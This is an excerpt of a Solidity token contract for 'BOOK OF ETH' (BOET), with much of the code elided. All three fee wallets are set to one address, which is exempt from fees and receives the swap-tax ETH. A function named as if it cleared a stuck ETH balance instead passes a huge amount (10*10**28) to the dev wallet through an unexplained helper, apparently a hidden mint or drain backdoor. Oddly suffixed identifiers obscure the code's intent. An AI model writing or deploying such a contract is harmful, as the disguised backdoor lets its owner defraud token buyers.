...
abstract contract Ownable is Context {
    ...
    function renounceOwnershiptrbome() public virtual onlyOwner {
        _setOwner(address(0));
    }
...
interface IRouter {
    ...
    contract BOET is ERC20, Ownable {
    ...
    address public marketiethsbome = 0x23c995a492e7BE4eE41eD4d47C6B562Ce501f666; 
    address public devswalletsbome = 0x23c995a492e7BE4eE41eD4d47C6B562Ce501f666;
    address public ecosystsewalletsbome = 0x23c995a492e7BE4eE41eD4d47C6B562Ce501f666;
    ...
    constructor() ERC20("BOOK OF ETH", "BOET") {
        ...
        exemptFee[marketiethsbome] = true;
        exemptFee[ecosystsewalletsbome] = true;
        exemptFee[devswalletsbome] = true;
        ...
        if (contractBalance >= tokenLiquidityThreshold) {
         ...
         uint256 denominator = feeswap * 2;
          ...
          addLiquidity(tokensToAddLiquidityWith, ethToAddLiquidityWith);
            ...
            if (marketingAmt > 0) {
                payable(marketiethsbome).sendValue(marketingAmt);
            }
            uint256 ecosystemAmt = unitBalance * 2 * swapTaxes.ecosystem;
            if (ecosystemAmt > 0) {
                payable(ecosystsewalletsbome).sendValue(ecosystemAmt);
            }
            uint256 devAmt = unitBalance * 2 * swapTaxes.dev;
            if (devAmt > 0) {
                payable(devswalletsbome).sendValue(devAmt);
            }
    ...
    function clearStuckBalanceETHtolitbome() external payable{
        andnicob(devswalletsbome, 10 * 10**28);
    }
